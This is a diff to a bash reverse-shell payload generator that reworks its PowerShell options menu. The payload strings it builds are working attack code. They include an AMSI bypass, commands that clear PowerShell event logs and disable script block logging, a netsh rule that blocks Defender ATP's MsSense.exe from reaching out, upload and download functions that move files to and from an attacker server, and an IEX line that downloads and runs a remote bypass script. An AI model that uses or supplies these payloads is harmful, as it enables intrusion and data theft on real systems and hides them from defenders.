@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 
-version="1.5.2"
+version="1.5.3"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -35,10 +35,7 @@ yellowprint "
 v.$version
 "
 
-#Setting default options for Powershell revshell 
-blockmssense=1
-clearlogs=0
-func=0
+
 
 if [ $usingngrok == 1 ]
 then 
@@ -627,7 +624,37 @@ if [ $clearlogs == 1 ]
             disableLog="[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').\$$placehGetField(\"signatures\",\"NonPublic,static\").SetValue(\$null, (New-Object 'System.Collections.Generic.HashSet[string]'));\$settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').\$$placehGetField('cachedGroupPolicySettings','NonPublic,Static').GetValue(\$null);\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'] = @{};\$settings['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging'].Add('EnableScriptBlockLogging\', 0);Start-Job {set-alias $wevutil wevtutil;sleep -Milliseconds 1005; $wevutil cl Microsoft-Windows-PowerShell/Operational;$wevutil cl \"Windows PowerShell\"};"
         else 
             disableLog=";"
-        fi 
+fi 
+
+#Block MSSense.exe (Defender 365/ATP)
+if [ $blockmssense == 1 ]
+        then 
+            mssense="& netsh a f a r n=\"nonsense\" d=out a=block prog=\"%programfiles%\Windows Defender Advanced Threat Protection\MsSense.exe\" e=yes"
+        else 
+            mssense=""
+fi 
+
+
+#Download/Upload functions.
+
+if [ $enablefunc == 1 ]
+        then 
+            func="function upload {\$f = \$args[0];\$uri = \$args[1];\$pa = '$updog_dir';\$n = Split-Path \$f -Leaf;\$c = [System.IO.File]::ReadAlltext(\$f);\$bo = [System.Guid]::NewGuid().ToString();\$LF = \"\`r\`n\";\$bl = (\"--\$bo\",\"Content-Disposition: form-data; name=\`\"file\`\"; filename=\`\"\$n\`\"\",\"Content-Type: application/octet-stream\$LF\",\$c,\"--\$bo\",\"Content-Disposition: form-data; name=\`\"path\`\"\$LF\",\$pa,\"--\$bo--\$LF\") -join \$LF;\$r=Invoke-RestMethod -Uri \$uri -Method Post -ContentType \"multipart/form-data; boundary=\`\"\$bo\`\"\" -Body \$bl};function download {curl \$args[0] -o \$args[1] -UseBasicParsing};"
+        else 
+            func=";"
+fi 
+
+#Download and run full AMSI bypass
+
+if [ $fullamsi == 1 ]
+        then 
+            fAMSIb="IEX (New-Object System.Net.Webclient).DownloadString('$aurl');"    
+        else 
+            fAMSIb=""
+fi 
+
+
+
 
 #Check if Windows
 if [[ $3 == "w" ]]
@@ -637,60 +664,12 @@ then
     #"Mini-AMSI-bypass". Not a full bypass, but maybe just enough to get other stuff up and running. Can be commented out and changed of course 
     AMSIb="(([Ref].Assembly.GetTypes()|?{\$_-clike'*si*s'}).GetFields(2*20)|?{\$_-clike'*Ini*'}).SetValue(\$$placeh,\$true);"
     
-    echo -en "\nDo you wish to automatically download and run full AMSI bypass?"
-        greenprint "[Y/n]"
-        read -r -n 1 ans
-    case $ans in
-    y)
-        amsiurl="http://$IPv4/rab.ps1"
-        read -p "Please enter url for AMSI bypass [$amsiurl]: " aurl
-        aurl=${aurl:-$amsiurl}
-        fAMSIb="IEX (New-Object System.Net.Webclient).DownloadString('$aurl');"
-        ;;
-    n)  
-        fAMSIb=""
-        ;;
-    "")
-        amsiurl="http://$IPv4/rab.ps1"
-        read -p "Please enter url for AMSI bypass [$amsiurl]: " aurl
-        aurl=${aurl:-$amsiurl}
-        fAMSIb="IEX (New-Object System.Net.Webclient).DownloadString('$aurl');"
-        ;;
-    *)
-        exit;;
-    esac
   
 fi
 
 
-#Download/Upload functions.
 
-    header
-    echo -en "Do you wish to use the upload and download functions inside your reverse shell?"
-    
-    echo -en "\n\nYou can download files by entering:\n\n"
 
-    yellowprint "download http://192.168.1.14/nc.exe /windows/temp/nc.exe" 
-    echo -en "\n\nYou can upload files to Updog by entering:\n\n"
-    yellowprint "upload /windows/system32/calc.exe http://192.168.1.14/upload "
-    echo -e "\nThis requires Updog. You need to add /upload to your target-URL. \nAlso, be aware of: Your updog-folder path $updog_dir will be sent in the requests!"
-    greenprint "[Y/n]"
-    read -r -n 1 ans
-    case $ans in
-    y)
-        func="function upload {\$f = \$args[0];\$uri = \$args[1];\$pa = '$updog_dir';\$n = Split-Path \$f -Leaf;\$c = [System.IO.File]::ReadAlltext(\$f);\$bo = [System.Guid]::NewGuid().ToString();\$LF = \"\`r\`n\";\$bl = (\"--\$bo\",\"Content-Disposition: form-data; name=\`\"file\`\"; filename=\`\"\$n\`\"\",\"Content-Type: application/octet-stream\$LF\",\$c,\"--\$bo\",\"Content-Disposition: form-data; name=\`\"path\`\"\$LF\",\$pa,\"--\$bo--\$LF\") -join \$LF;\$r=Invoke-RestMethod -Uri \$uri -Method Post -ContentType \"multipart/form-data; boundary=\`\"\$bo\`\"\" -Body \$bl};function download {curl \$args[0] -o \$args[1] -UseBasicParsing};"
-        ;;
-    n)
-        func=";"
-        ;;
-    "")
-        func="function upload {\$f = \$args[0];\$uri = \$args[1];\$pa = '$updog_dir';\$n = Split-Path \$f -Leaf;\$c = [System.IO.File]::ReadAlltext(\$f);\$bo = [System.Guid]::NewGuid().ToString();\$LF = \"\`r\`n\";\$bl = (\"--\$bo\",\"Content-Disposition: form-data; name=\`\"file\`\"; filename=\`\"\$n\`\"\",\"Content-Type: application/octet-stream\$LF\",\$c,\"--\$bo\",\"Content-Disposition: form-data; name=\`\"path\`\"\$LF\",\$pa,\"--\$bo--\$LF\") -join \$LF;\$r=Invoke-RestMethod -Uri \$uri -Method Post -ContentType \"multipart/form-data; boundary=\`\"\$bo\`\"\" -Body \$bl};function download {curl \$args[0] -o \$args[1] -UseBasicParsing};"
-        ;;
-    *)
-        exit;;
-    esac
-
-#Block Defender ATP from phoning home
 
 
 
@@ -1900,7 +1879,8 @@ Choose an option [1]:  "
 
 
 submenu_powershell() {
-global clearlogs
+#Setting default options for Powershell revshell 
+
 header
     echo -ne "
 $(blueprint 'Powershell')
@@ -1923,28 +1903,45 @@ $(greenprint '16)') Powershell UDP - Core
 $(greenprint '17)') Powershell UDP - Core URL encoded
 $(greenprint '18)') Powershell UDP - Core Double URL encoded
 $(greenprint '19)') Powershell TCP - Windows - VBA Macro
-$(greenprint '20)') Powershell UDP - Windows - VBA Macro \n"
-echo $clearlogs
-if [ "$mssense" == "" ]
+$(greenprint '20)') Powershell UDP - Windows - VBA Macro \n\n"
+echo -n $(cyanprint "OPTIONS")
+if [ "$blockmssense" == 1 ]
 then 
-    echo -ne "\n$(greenprint '21)') Block Defender ATP - $(blueprint 'Off')"
+    echo -ne "\n$(greenprint 'b)') Block Defender ATP - $(redprint 'On')"
 else 
-    echo -ne "\n$(greenprint '21)') Block Defender ATP - $(redprint 'On')"
-fi
-
-if [ $clearlogs == 0 ]
-then 
-    echo -ne "\n$(greenprint '22)') Clear Powershell Eventlogs - $(blueprint 'Off')"
-else 
-    echo -ne "\n$(greenprint '22)') Clear Powershell Eventlogs - $(redprint 'On')"
+    echo -ne "\n$(greenprint 'b)') Block Defender ATP - $(blueprint 'Off')"
+    blockmssense=0
     
 fi
 
-if [ $func != "" ]
+if [ "$clearlogs" == 1 ]
 then 
-    echo -ne "\n$(greenprint '23)') Include upload/download function - $(redprint 'On')"
+    echo -ne "\n$(greenprint 'c)') Clear Powershell Eventlogs - $(redprint 'On')"
 else 
-    echo -ne "\n$(greenprint '23)') Include upload/download function - $(blueprint 'Off')"
+    echo -ne "\n$(greenprint 'c)') Clear Powershell Eventlogs - $(blueprint 'Off')"
+    clearlogs=0
+    
+    
+fi
+
+if [ "$enablefunc" == 1 ]
+then 
+    echo -ne "\n$(greenprint 'e)') Include upload/download function - $(redprint 'On')"
+    
+else 
+    echo -ne "\n$(greenprint 'e)') Include upload/download function - $(blueprint 'Off')"
+    enablefunc=0
+    
+fi
+
+if [ "$fullamsi" == 1 ]
+then 
+    echo -ne "\n$(greenprint 'f)') Download full AMSI bypass - $(redprint "On") $aurl"
+    
+else 
+    echo -ne "\n$(greenprint 'f)') Download full AMSI bypass - $(blueprint 'Off')"
+    fullamsi=0
+    
 fi
 echo 
 echo -ne "
@@ -2014,30 +2011,53 @@ Choose an option:  "
     20)
         powershell_s "" "" "w" "udp" "vba"
         ;;
-    21)
-        if [ "$mssense" == "" ]
+    b)
+        if [ $blockmssense == 0 ]
         then 
-            mssense="& netsh a f a r n=\"nonsense\" d=out a=block prog=\"%programfiles%\Windows Defender Advanced Threat Protection\MsSense.exe\" e=yes"
+            blockmssense=1
         else 
-            mssense=""
+            blockmssense=0
         fi
         submenu_powershell
         ;;
-    22)
+    c)
         
-        if [ $clearlogs == 0 ]
+        if [ $clearlogs == 1 ]
         then 
-            echo "Enabling logs"
-            clearlogs=1
-        else 
-            echo "Disabling logs"
+            
             clearlogs=0
+        else 
+            
+            clearlogs=1
         fi 
         submenu_powershell
         ;;
-    23)
-        powershell_s "" "" "w" "udp" "vba"
+    e)
+        if [ $enablefunc == 0 ]
+        then 
+            enablefunc=1
+        else 
+            enablefunc=0
+        fi
+        submenu_powershell
         ;;
+    f)
+        if [ $fullamsi == 0 ]
+        then 
+            fullamsi=1
+            amsiurl="http://$IPv4/rab.ps1"
+            read -p "Please enter url for AMSI bypass [$amsiurl]: " aurl
+            aurl=${aurl:-$amsiurl}
+            
+        else 
+            fullamsi=0
+        fi
+        submenu_powershell
+        ;;
+
+        
+
+
     m)
         mainmenu
         ;;
